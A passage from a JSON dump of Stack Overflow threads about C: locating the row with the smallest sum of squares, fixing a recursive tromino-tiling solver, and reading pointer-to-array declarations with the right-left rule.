"https://stackoverflow.com/questions/41362212/finding-the-number-of-row-with-the-smallest-sum-of-powers-c/41362333#41362333", "title": "Finding the number of row with the smallest sum of powers, C", "body": "<p>This line kills all your \"memory\" of previous rows:</p>\n\n<pre><code>minsum = sum;\n</code></pre>\n\n<p>You should only update <code>minsum</code> together with updating <code>minindex</code>.</p>\n\n<p>Also your condition for updating <code>minindex</code> seems to be the wrong way around.</p>\n"}, {"tags": [], "owner": {"reputation": 2988, "user_id": 452414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/rDMfs.png?s=128&g=1", "display_name": "babon", "link": "https://stackoverflow.com/users/452414/babon"}, "is_accepted": false, "score": 0, "last_activity_date": 1482935379, "last_edit_date": 1482935379, "creation_date": 1482933124, "answer_id": 41363491, "question_id": 41362212, "link": "https://stackoverflow.com/questions/41362212/finding-the-number-of-row-with-the-smallest-sum-of-powers-c/41363491#41363491", "title": "Finding the number of row with the smallest sum of powers, C", "body": "<p>This would be one way to do (although a bare-bones version):</p>\n\n<pre><code>#define NROWS 3\n#define NCOLS 3\n\nint *getminrow(int *p, int n)\n{\n        int minval = *p;\n        int *minaddr = p;\n\n        while (n &gt;= 1) {\n                if (*p &lt; minval) {\n                        minval = *p;\n                        minaddr = p;\n                }\n                n--;\n                p++;\n        }\n\n        return minaddr;\n}\n\n\nint sumrow(int *p, int n)\n{\n        int sum = 0;\n        while (n &gt;= 1) {\n                sum += (*p);\n                n--;\n                p++;\n        }\n\n        return sum;\n}\n\nint main(void)\n{\n        int *array = malloc(NROWS * NCOLS);\n        int listsum[NROWS];\n        int i, j;\n\n        array[0 * NROWS + 0] = 1;\n        array[0 * NROWS + 1] = 1;\n        array[0 * NROWS + 2] = 1;\n\n        array[1 * NROWS + 0] = 2;\n        array[1 * NROWS + 1] = 2;\n        array[1 * NROWS + 2] = 2;\n\n        array[2 * NROWS + 0] = 3;\n        array[2 * NROWS + 1] = 3;\n        array[2 * NROWS + 2] = 3;\n\n        for (i = 0; i &lt; NROWS; i++) {\n                for (j = 0; j &lt; NCOLS; j++) {\n                        array[i * NROWS + j] = pow(array[i * NROWS + j], 2);\n                }\n        }\n\n        for (i = 0; i &lt; NROWS; i++) \n                listsum[i] = sumrow(&amp;array[i], NCOLS);\n\n        printf(\"Min row: %d\\n\", getminrow(listsum, NROWS) - listsum);\n\n        return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 7346870, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L9YhW.png?s=128&g=1", "display_name": "Shiki-kan", "link": "https://stackoverflow.com/users/7346870/shiki-kan"}, "reply_to_user": {"reputation": 2026, "user_id": 3789665, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/38983281a7926f50843153d9e0788cdf?s=128&d=identicon&r=PG&f=1", "display_name": "greybeard", "link": "https://stackoverflow.com/users/3789665/greybeard"}, "edited": false, "score": 0, "creation_date": 1483014727, "post_id": 41378924, "comment_id": 69961323, "body": "wkwkwkwk... I apologize for my poor English language skills. I just want to help to solve the problem. (and about the syntax,, thanks for the correction)"}, {"owner": {"reputation": 2026, "user_id": 3789665, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/38983281a7926f50843153d9e0788cdf?s=128&d=identicon&r=PG&f=1", "display_name": "greybeard", "link": "https://stackoverflow.com/users/3789665/greybeard"}, "edited": false, "score": 0, "creation_date": 1483020918, "post_id": 41378924, "comment_id": 69964741, "body": "<code>I apologize for my poor English language skills.</code> don&#39;t - it isn&#39;t anybody&#39;s fault not to be a &quot;native speaker&quot; (<code>wkwkwkwk</code>&amp;profile image: near Indonesia?). Just make your computer help you (use a spelling checker), and try to make your contributions easy to understand. (<i>Not</i> saying you have done bad in that regard.)"}], "tags": [], "owner": {"reputation": 1, "user_id": 7346870, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L9YhW.png?s=128&g=1", "display_name": "Shiki-kan", "link": "https://stackoverflow.com/users/7346870/shiki-kan"}, "is_accepted": false, "score": 0, "last_activity_date": 1483014895, "last_edit_date": 1483014895, "creation_date": 1483011337, "answer_id": 41378924, "question_id": 41362212, "link": "https://stackoverflow.com/questions/41362212/finding-the-number-of-row-with-the-smallest-sum-of-powers-c/41378924#41378924", "title": "Finding the number of row with the smallest sum of powers, C", "body": "<p>I think there are some problem in your logic. First \"if(minisum&lt;=sum)\". It must be \"if(sum&lt;=minisum)\". Second, if you're just using coding like that, then the condition will be considered only condition i and i-1. So, my advice to change the syntax \"if(minisum&lt;=sum)\" with the following script. (There are new variables that I call minisumtemp).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nint ** alloc(int n, int m)\n{\n    int **array, i;\n\n    array = malloc(sizeof(int*) * n);\n\n    for(i=0; i&lt;n; i++)\n        array[i] = malloc(sizeof(int) * m);\n\n    return array;\n}\n\nvoid show(int **array, int n, int m)\n{\n    int i,j;\n\n    for(i=0; i&lt;n; i++)\n    {\n        for(j=0; j&lt;m; j++)\n        {\n            printf(\"%d\\t\", array[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}\n\nvoid fill(int **array, int n, int m, int x)\n{\n    int i,j;\n\n    for(i=0; i&lt;n; i++)\n    {\n        for(j=0; j&lt;m; j++)\n        {\n            array[i][j] = x;\n        }\n    }\n}\n\nvoid dealloc(int **array, int n, int m)\n{\n    int i;\n    for(i=0; i&lt;n; i++)\n        free(array[i]);\n    free(array);\n}\n\nint smallest_powers_sum(int **array, int n, int m)\n{\n    //int sum = 0, minsum = 0, i, j, minindex = -1;\n    int sum = 0, minsum = 0, i, j, minindex = 0, minsumtemp; // add new variable : minsumtemp\n\n    for(i=0; i&lt;n; i++)\n    {\n        minsum = sum;\n        sum = 0;\n\n        for(j=0; j&lt;m; j++)\n        {\n            sum += pow(array[i][j], 2);\n        }\n\n        //if(minsum &lt;= sum)   this the problem\n         //   minindex = i;\n        if (i==0) minsumtemp = sum; // initialized first value for minsumtep\n        if (sum&lt;=minsumtemp)\n        {\n            minindex = i;\n            minsumtemp = sum;\n        }\n\n        printf(\"sum = %d, minsum = %d, minindex = %d\\n\", sum, minsum, minindex);\n    }\n\n    return minindex;\n}\n\nint main(int argc, char **argv)\n{\n    int **array, n1 = 3, m1 = 3;\n\n    array = alloc(n1, m1);\n    fill(array, n1, m1, 1);\n\n    array[0][0] = 1;\n    array[0][1] = 1;\n    array[0][2] = 1;\n\n    array[1][0] = 2;\n    array[1][1] = 2;\n    array[1][2] = 2;\n\n    array[2][0] = 3;\n    array[2][1] = 3;\n    array[2][2] = 3;\n\n\n    int sum = smallest_powers_sum(array, n1, m1);\n    printf(\"index = %d\\n\", sum);\n\n    dealloc(array, n1, m1);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 526, "user_id": 3163216, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/8b26cac504c060277cce703d2e560319?s=128&d=identicon&r=PG&f=1", "display_name": "mirx", "link": "https://stackoverflow.com/users/3163216/mirx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1483014895, "creation_date": 1482928225, "question_id": 41362212, "link": "https://stackoverflow.com/questions/41362212/finding-the-number-of-row-with-the-smallest-sum-of-powers-c", "title": "Finding the number of row with the smallest sum of powers, C", "body": "<p>I have an array, in which I need to find the number of row, which has the smallest sum of powers. Consider the example array:</p>\n\n<pre><code>1 1 1\n2 2 2\n3 3 3 \n</code></pre>\n\n<p>The first row, (index = 0), the sum of powers is equal to 3 (1^2 + 1^2 + 1^2 = 3).</p>\n\n<p>The second row, (index = 1), the sum of powers is equal to 12 (2^2 + 2^2 + 2^2 = 12).</p>\n\n<p>The third row, (index = 2), the sum of powers is equal to 27 (3^2 + 3^2 + 3^2 = 27).</p>\n\n<p>But my program shows the wrong result - instead of index <code>0</code>, it shows index <code>2</code>. What is the problem?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nint ** alloc(int n, int m)\n{\n    int **array, i;\n\n    array = malloc(sizeof(int*) * n);\n\n    for(i=0; i&lt;n; i++)\n        array[i] = malloc(sizeof(int) * m);\n\n    return array;\n}\n\nvoid show(int **array, int n, int m)\n{\n    int i,j;\n\n    for(i=0; i&lt;n; i++)\n    {\n        for(j=0; j&lt;m; j++)\n        {\n            printf(\"%d\\t\", array[i][j]);\n        }\n        printf(\"\\n\");\n    }\n}\n\nvoid fill(int **array, int n, int m, int x)\n{\n    int i,j;\n\n    for(i=0; i&lt;n; i++)\n    {\n        for(j=0; j&lt;m; j++)\n        {\n            array[i][j] = x;\n        }\n    }\n}\n\nvoid dealloc(int **array, int n, int m)\n{\n    int i;\n    for(i=0; i&lt;n; i++)\n        free(array[i]);\n    free(array);\n}\n\nint smallest_powers_sum(int **array, int n, int m)\n{\n    int sum = 0, minsum = 0, i, j, minindex = -1;\n\n    for(i=0; i&lt;n; i++)\n    {\n        minsum = sum;\n        sum = 0;\n\n        for(j=0; j&lt;m; j++)\n        {\n            sum += pow(array[i][j], 2);\n        }\n\n        if(minsum &lt;= sum)\n            minindex = i;\n\n        printf(\"sum = %d, minsum = %d, minindex = %d\\n\", sum, minsum, minindex);\n    }\n\n    return minindex;\n}\n\nint main(int argc, char **argv)\n{\n    int **array, n1 = 3, m1 = 3;\n\n    array = alloc(n1, m1);\n    fill(array, n1, m1, 1);\n\n    array[0][0] = 1;\n    array[0][1] = 1;\n    array[0][2] = 1;\n\n    array[1][0] = 2;\n    array[1][1] = 2;\n    array[1][2] = 2;\n\n    array[2][0] = 3;\n    array[2][1] = 3;\n    array[2][2] = 3;\n\n\n    int sum = smallest_powers_sum(array, n1, m1);\n    printf(\"index = %d\\n\", sum);\n\n    dealloc(array, n1, m1);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "algorithm"], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4108694"}, "edited": false, "score": 0, "creation_date": 1482929673, "post_id": 41362546, "comment_id": 69926255, "body": "okay I though it too, but is it possible based on my code? I don&#39;t want to change the structure now."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4108694"}, "edited": false, "score": 0, "creation_date": 1482930871, "post_id": 41362546, "comment_id": 69926938, "body": "Thank you very much. I understood the problem. I just can&#39;t find the right combinations to make with the missing cube position."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4108694"}, "edited": false, "score": 0, "creation_date": 1482932524, "post_id": 41362546, "comment_id": 69927814, "body": "I made a  progress I believe. Please check my update. Thank you very much!!! Ohh just saw we thought the same thing!"}, {"owner": {"user_type": "does_not_exist", "display_name": "user4108694"}, "edited": false, "score": 0, "creation_date": 1482933946, "post_id": 41362546, "comment_id": 69928634, "body": "please update your answer to clarify this. You have to add <code>++(*currBlockNum);</code> above all the four recursions!"}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1482934108, "post_id": 41362546, "comment_id": 69928713, "body": "@GeorgeGkas - I have made that part a little more clear"}], "tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": true, "score": 3, "last_activity_date": 1482934085, "last_edit_date": 1482934085, "creation_date": 1482929567, "answer_id": 41362546, "question_id": 41361916, "link": "https://stackoverflow.com/questions/41361916/divide-and-conquer-trominos-algorithm-in-c/41362546#41362546", "title": "Divide and conquer trominos algorithm in C", "body": "<p>As far as I can see, the strategy is to place the L in such a way that it occupies exactly one cube in the 3 squares that doesn't contain an already occupied cube.</p>\n\n<p>In other words:</p>\n\n<ul>\n<li>you split the input square into 4 squares. </li>\n<li>One of these already have an occupied cube. </li>\n<li>You place the L so that the 3 other squares also ends up with exactly one occupied cube. </li>\n</ul>\n\n<p>Consequently you now have 4 squares - all with exactly one occupied cube. So now you can run the function on these four squares.</p>\n\n<p><a href=\"https://i.stack.imgur.com/huiCQ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/huiCQ.png\" alt=\"enter image description here\"></a></p>\n\n<p>Now you can handle each of the 4 squares independently as each square has exactly one occupied cube.</p>\n\n<p><strong>So what is the problem with your code?</strong></p>\n\n<p>The problem is that you don't update the position of the occupied cube but simply keeps the original position.</p>\n\n<pre><code>    // top-right sub-partion\n    recursiveSolve(m, A, A_row, A_colCenter, t_row, t_col, ++currBlockNum, A_halfSize);\n                                             ^^^^^^^^^^^^\n                                             May need update before calling\n\n    // bottom-right sub-partion\n    recursiveSolve(m, A, A_rowCenter, A_colCenter, t_row, t_col, ++currBlockNum, A_halfSize);\n                                                    ^^^^^^^^^^^^\n                                                    May need update before calling\n\n    // bottom left sub-partition\n    recursiveSolve(m, A, A_rowCenter, A_col, t_row, t_col, ++currBlockNum, A_halfSize);\n                                             ^^^^^^^^^^^^\n                                             May need update before calling\n\n    // top-left sub-partition\n    recursiveSolve(m, A, A_row, A_col, t_row, t_col, ++currBlockNum, A_halfSize);\n                                        ^^^^^^^^^^^^\n                                        May need update before calling\n</code></pre>\n\n<p><strong>For 3 of the 4 calls, you need to update the position of the occupied square.</strong></p>\n\n<p>That can be achieved in many ways. Here is one approach:</p>\n\n<pre><code>void recursiveSolve(int m, int A[m][m], int A_row, int A_col, int t_row, int t_col, int currBlockNum, int boardSize) {\n    if (boardSize == 2) {\n\n        // Keep your existing code unchanged here\n\n    } else {\n        int A_halfSize = boardSize / 2;\n\n        // the bellow calculations allow us to check which\n        // sub-partition of our board includes the missing block,\n        // as well as how we should paint the center L shaped block.\n        int A_rowCenter = A_row + A_halfSize;\n        int A_colCenter = A_col + A_halfSize;\n\n        // Calculate the position of the center cubes\n        // as these will be the new occupied cub for\n        // 3 of the 4 squares\n        int TR_t_row = A_rowCenter - 1;\n        int TR_t_col = A_colCenter;\n\n        int BR_t_row = A_rowCenter;\n        int BR_t_col = A_colCenter - 1;\n\n        int BL_t_row = A_rowCenter - 1;\n        int BL_t_col = A_colCenter;\n\n        int TL_t_row = A_rowCenter - 1;\n        int TL_t_col = A_colCenter - 1;\n\n\n\n        if (t_row &lt; A_rowCenter) { // missing block in top half\n            if (t_col &lt; A_colCenter ) { // missing block is in top left half\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n\n                TL_t_row = t_row;  // Roll back to \n                TL_t_col = t_col;  // original occupied cube\n\n            } else { // missing block is in top right half\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n\n                TR_t_row = t_row;  // Roll back\n                TR_t_col = t_col;\n\n            }\n\n        } else { // missing block in bottom half\n            if (t_col &lt; A_colCenter ) { // missing block is in bottom left half\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n\n                BL_t_row = t_row;  // Roll back\n                BL_t_col = t_col;\n\n            } else { // missing block is in bottom right half\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n\n                BR_t_row = t_row;  // Roll back\n                BR_t_col = t_col;\n\n            }\n        }\n\n        // solve each sub-partion recursively\n\n        // Use the 8 new variables for the recursive calls\n\n        // top-right sub-partion\n        recursiveSolve(m, A, A_row, A_colCenter, TR_t_row, TR_t_col, ++currBlockNum, A_halfSize);\n                                             //  ^^^^^^^^^^^^^^^^^^\n\n        // bottom-right sub-partion\n        recursiveSolve(m, A, A_rowCenter, A_colCenter, BR_t_row, BR_t_col, ++currBlockNum, A_halfSize);\n                                                   //  ^^^^^^^^^^^^^^^^^^\n\n        // bottom left sub-partition\n        recursiveSolve(m, A, A_rowCenter, A_col, BL_t_row, BL_t_col, ++currBlockNum, A_halfSize);\n                                             //  ^^^^^^^^^^^^^^^^^^\n\n        // top-left sub-partition\n        recursiveSolve(m, A, A_row, A_col, TL_t_row, TL_t_col, ++currBlockNum, A_halfSize);\n                                       //  ^^^^^^^^^^^^^^^^^^\n    }\n}\n</code></pre>\n\n<h2>Update</h2>\n\n<p>If you want to avoid using the same number for multiple L, you should pass a pointer to <code>currBlockNum</code> instead.</p>\n\n<p>Change the prototype - notice the <code>int* currBlockNum</code>:</p>\n\n<pre><code>void recursiveSolve(int m, int A[m][m], int A_row, int A_col, int t_row, int t_y, int* currBlockNum, int boardSize);\n</code></pre>\n\n<p>In main do:</p>\n\n<pre><code>int currBlockNum = 1;\nrecursiveSolve(m, A, 0, 0, t_row, t_col, &amp;currBlockNum, m);\n                                        ^^^\n                                        Notice\n</code></pre>\n\n<p>In the function change <strong>all</strong> place where you want to assign the value - like</p>\n\n<pre><code>A[A_row+1][A_col]  = *currBlockNum;\n                    ^^^\n                    Notice\n</code></pre>\n\n<p>and <strong>every time</strong> you call the function recursively, do an increment first - like:</p>\n\n<pre><code>    ++(*currBlockNum);\n    recursiveSolve(m, A, A_row, A_colCenter, TR_t_row, TR_t_col, currBlockNum, A_halfSize);\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4108694"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 546, "favorite_count": 1, "accepted_answer_id": 41362546, "answer_count": 1, "score": 5, "last_activity_date": 1482934085, "creation_date": 1482927171, "last_edit_date": 1592644375, "question_id": 41361916, "link": "https://stackoverflow.com/questions/41361916/divide-and-conquer-trominos-algorithm-in-c", "title": "Divide and conquer trominos algorithm in C", "body": "<p>This is the classic <a href=\"https://en.wikipedia.org/wiki/Divide_and_conquer_algorithm\" rel=\"nofollow noreferrer\">divide and conquer</a> problem. We have a <strong>2^n * 2^n</strong> board and we want to fill it with L shaped cubes. We know there is one block on the board that we can't assign a cube. This problem is also known as <a href=\"https://en.wikipedia.org/wiki/Tromino\" rel=\"nofollow noreferrer\">tromino</a> problem (somewhat).</p>\n<h2>Problem</h2>\n<p>My solution works for n = 1 and n = 2. But when I wan to further generalize the solution (n &gt; 2), I don't get all the blocks filled and some of them consist of false L shaped cube parts.</p>\n<h2>Program structure</h2>\n<h2>Inputs</h2>\n<p>The user enters <code>n</code> and the position of the missing cube <code>t</code> on the board.</p>\n<h2>Output</h2>\n<p>We print the board filled with &quot;trominos&quot;. We assign a value to each one of them. The missing cude always get zero value and each &quot;tromino&quot; contains a integer value (1, 2, 3, ....).</p>\n<h2>Solution</h2>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid recursiveSolve(int m, int A[m][m], int A_row, int A_col, int t_row, int t_y, int currBlockNum, int boardSize);\n\nint main(void) {\n    int n, m;\n\n    do {\n        printf(&quot;Give n &gt; 0: &quot;);\n        scanf(&quot;%d&quot;, &amp;n);\n    } while (n &lt;= 0);\n\n    m = pow(2, n);\n\n    int A[m][m];\n\n    for (int i = 0; i &lt; m; ++i) {\n        for (int j = 0; j &lt; m; ++j) {\n            A[i][j] = -1;\n        }\n    }\n\n    int t_row, t_col;\n\n    do {\n        printf(&quot;Give missing square row coordinate: &quot;);\n        scanf(&quot;%d&quot;, &amp;t_row);\n        printf(&quot;Give missing square column coordinate: &quot;);\n        scanf(&quot;%d&quot;, &amp;t_col);\n    } while (t_row &gt;= m || t_col &gt;= m);\n\n    A[t_row][t_col] = 0;\n\n    recursiveSolve(m, A, 0, 0, t_row, t_col, 1, m);\n\n    for (int i = 0; i &lt; m; ++i) {\n        for (int j = 0; j &lt; m; ++j) {\n                printf(&quot;%2d &quot;, A[i][j]);\n        }\n        printf(&quot;\\n&quot;);\n    }\n\n    return 0;\n}\n\nvoid recursiveSolve(int m, int A[m][m], int A_row, int A_col, int t_row, int t_col, int currBlockNum, int boardSize) {\n    if (boardSize == 2) { // fill with L shaped block the area that is blank (no block exist).\n\n        // check first which part of our board if filled up with  a block\n        // and then paint the other.\n        if (A[A_row][A_col] != -1) { // block exist at the top-left corner\n            A[A_row+1][A_col]  = currBlockNum; // paint the bottom-left corner\n            A[A_row+1][A_col+1] = currBlockNum; // paint the bottom-right corner\n            A[A_row][A_col+1] = currBlockNum; // paint the top-right corner\n\n        } else if (A[A_row][A_col+1] != -1) { // block exist at the top-right corner\n            A[A_row][A_col] = currBlockNum; // paint the top-left corner\n            A[A_row+1][A_col] = currBlockNum; // paint the bottom-left corner\n            A[A_row+1][A_col+1] = currBlockNum; // paint the bottom-right corner\n\n        } else if (A[A_row+1][A_col] != -1) { // block exist at the bottom-left corner\n            A[A_row][A_col] = currBlockNum;\n            A[A_row][A_col+1] = currBlockNum;\n            A[A_row+1][A_col+1] = currBlockNum;\n\n        } else { // block exist at the bottom-right corner\n            A[A_row][A_col] = currBlockNum;\n            A[A_row][A_col+1] = currBlockNum;\n            A[A_row+1][A_col] = currBlockNum;\n        }\n\n    } else {\n        int A_halfSize = boardSize / 2;\n\n        // the bellow calculations allow us to check which\n        // sub-partition of our board includes the missing block,\n        // as well as how we should paint the center L shaped block.\n        int A_rowCenter = A_row + A_halfSize;\n        int A_colCenter = A_col + A_halfSize;\n\n\n        if (t_row &lt; A_rowCenter) { // missing block in top half\n            if (t_col &lt; A_colCenter ) { // missing block is in top left half\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n            } else { // missing block is in top right half\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n            }\n\n        } else { // missing block in bottom half\n            if (t_col &lt; A_colCenter ) { // missing block is in bottom left half\n                A[A_rowCenter][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n            } else { // missing block is in bottom right half\n                A[A_rowCenter][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter-1] = currBlockNum;\n                A[A_rowCenter-1][A_colCenter] = currBlockNum;\n            }\n        }\n\n        // solve each sub-partion recursively\n\n        // top-right sub-partion\n        recursiveSolve(m, A, A_row, A_colCenter, t_row, t_col, ++currBlockNum, A_halfSize);\n\n        // bottom-right sub-partion\n        recursiveSolve(m, A, A_rowCenter, A_colCenter, t_row, t_col, ++currBlockNum, A_halfSize);\n\n        // bottom left sub-partition\n        recursiveSolve(m, A, A_rowCenter, A_col, t_row, t_col, ++currBlockNum, A_halfSize);\n\n        // top-left sub-partition\n        recursiveSolve(m, A, A_row, A_col, t_row, t_col, ++currBlockNum, A_halfSize);\n    }\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "pointers"], "comments": [{"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 4, "creation_date": 1482927086, "post_id": 41361814, "comment_id": 69924847, "body": "<a href=\"http://cdecl.org\" rel=\"nofollow noreferrer\">cdecl.org</a> will help."}], "answers": [{"tags": [], "owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "is_accepted": false, "score": 2, "last_activity_date": 1482927154, "creation_date": 1482927154, "answer_id": 41361912, "question_id": 41361814, "link": "https://stackoverflow.com/questions/41361814/hard-time-understanding-precedence-principle-of-char-psizeofc/41361912#41361912", "title": "Hard time understanding precedence principle of char (*p)[sizeof(c)];", "body": "<p>In this definition </p>\n\n<pre><code>char (*p)[sizeof(c)];\n</code></pre>\n\n<p>you define a variable p which is a pointer (the contenct of the brackets are evaluated first) to an array of characters with size [sizeof c].\nAt this point in your code p does not point anywhere specific as it is not initialized yet.</p>\n\n<p>With the other definition</p>\n\n<pre><code>char *p[sizeof(c)];\n</code></pre>\n\n<p>you define a variable p which is an array (the * is evaluated later) of pointers to character.</p>\n\n<p>you have a pointer to an array vs an array of pointers.</p>\n"}, {"tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 2, "last_activity_date": 1482927266, "creation_date": 1482927266, "answer_id": 41361952, "question_id": 41361814, "link": "https://stackoverflow.com/questions/41361814/hard-time-understanding-precedence-principle-of-char-psizeofc/41361952#41361952", "title": "Hard time understanding precedence principle of char (*p)[sizeof(c)];", "body": "<p>Type mismatch in your assignment</p>\n\n<pre><code>p = &amp;c;\n</code></pre>\n\n<p>is the problem.</p>\n\n<p><code>c</code> is an array of 10 chars and and <code>&amp;c</code> is a <em>pointer to an array</em> of 10 chars.</p>\n\n<p>In  <code>char (*p)[sizeof(c)];</code>, <code>p</code> is a <em>pointer to an array</em> of <code>sizeof(c)</code> (10) chars. So, this matches with the type of <code>&amp;c</code>.</p>\n\n<p>In  <code>char *p[sizeof(c)];</code>, <code>p</code> is an <em>array of <code>sizeof(c)</code> (10) pointers</em>. But this doesn't match with the type of <code>&amp;c</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 374, "user_id": 4179642, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/9f75a77b3e5fd92911c48b01c471ab81?s=128&d=identicon&r=PG&f=1", "display_name": "Pipsqweek", "link": "https://stackoverflow.com/users/4179642/pipsqweek"}, "edited": false, "score": 0, "creation_date": 1482927545, "post_id": 41362000, "comment_id": 69925128, "body": "This is great progress, though I&#39;m going to have to review your answer a few times just to get acquainted with it. GREAT answer. Thanks."}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "reply_to_user": {"reputation": 374, "user_id": 4179642, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/9f75a77b3e5fd92911c48b01c471ab81?s=128&d=identicon&r=PG&f=1", "display_name": "Pipsqweek", "link": "https://stackoverflow.com/users/4179642/pipsqweek"}, "edited": false, "score": 0, "creation_date": 1482927735, "post_id": 41362000, "comment_id": 69925239, "body": "The hardest part is finding the variable name, but it&#39;s a matter of getting used to it. Try your teeth on <code>int *(*(*p)(void(*(*x)(int *a))(void)))[4]</code> next ;)"}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "reply_to_user": {"reputation": 374, "user_id": 4179642, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/9f75a77b3e5fd92911c48b01c471ab81?s=128&d=identicon&r=PG&f=1", "display_name": "Pipsqweek", "link": "https://stackoverflow.com/users/4179642/pipsqweek"}, "edited": false, "score": 2, "creation_date": 1482928284, "post_id": 41362000, "comment_id": 69925539, "body": "@Pipsqweek also please don&#39;t write such horrors outside of syntax challenges. It took me a good five minutes to check that I hadn&#39;t made a mistake in the parentheses caterpillar above..."}], "tags": [], "owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "is_accepted": true, "score": 15, "last_activity_date": 1482927424, "creation_date": 1482927424, "answer_id": 41362000, "question_id": 41361814, "link": "https://stackoverflow.com/questions/41361814/hard-time-understanding-precedence-principle-of-char-psizeofc/41362000#41362000", "title": "Hard time understanding precedence principle of char (*p)[sizeof(c)];", "body": "<p>Types in C can be read with what is informally known as the <em>right-left rule</em>. You start from the name of the variable being declared, then go right while you can, then go left while you can, and start again. Parentheses stop you until all of their content has been considered.</p>\n\n<p>In your example:</p>\n\n<pre><code>char (*p)[sizeof(c)];\n       ^               p...                          (hit ')', turn around)\n      ^                is a pointer...               (hit '(', turn around and remove '()')\n         ^^^^^^^^^^^   to an array of `sizeof(c)`... (end of line, turn around)\n^^^^                   chars.                        nothing left, we're done!\n</code></pre>\n\n<p>Without the parentheses, this becomes:</p>\n\n<pre><code>char *p[sizeof(c)];\n      ^^^^^^^^^^^^     p is an array of `sizeof(c)`... (end of line, turn 